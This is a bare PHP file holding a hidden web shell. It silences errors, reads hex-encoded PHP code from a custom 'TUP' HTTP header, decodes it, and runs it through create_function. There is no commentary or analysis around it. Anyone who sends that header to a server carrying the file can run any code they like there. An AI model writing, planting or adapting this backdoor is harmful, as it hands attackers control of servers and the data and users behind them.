<?php

error_reporting(0);
if(isset($_SERVER['HTTP_TUP'])){
$c = $_SERVER['HTTP_TUP'];
$c=str_replace(array("\n","\t","\r"),"",$c);
$buf="";for($i=0;$i<strlen($c);$i+=2)
$buf.=urldecode("%".substr($c,$i,2));
$FiLi=Create_Function("",$buf);$FiLi();exit;
}

?>
